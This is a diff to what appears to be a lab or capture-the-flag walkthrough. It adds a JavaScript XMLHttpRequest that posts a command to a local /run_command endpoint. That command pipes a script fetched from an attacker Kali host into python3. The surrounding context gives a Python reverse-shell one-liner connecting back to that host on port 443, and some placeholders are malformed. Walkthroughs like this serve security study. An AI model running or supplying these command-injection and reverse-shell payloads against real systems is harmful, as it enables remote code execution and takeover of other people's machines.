@@ -118,6 +118,15 @@ fetch('http://localhost:3000/run_command', {
 })
 ```
 
+OR)
+
+```
+const xhr = new XMLHttpRequest();
+xhr.open("POST", "http://localhost:3000/run_command", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("cmd=curl http:///<KaliIP:80/rce.py|python3");
+```
+
 - Create a Python reverse shell call rce.py and host it on port 80 in our Kali machine.
 ```
 import os,pty,socket;s=socket.socket();s.connect(("<KaliIP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
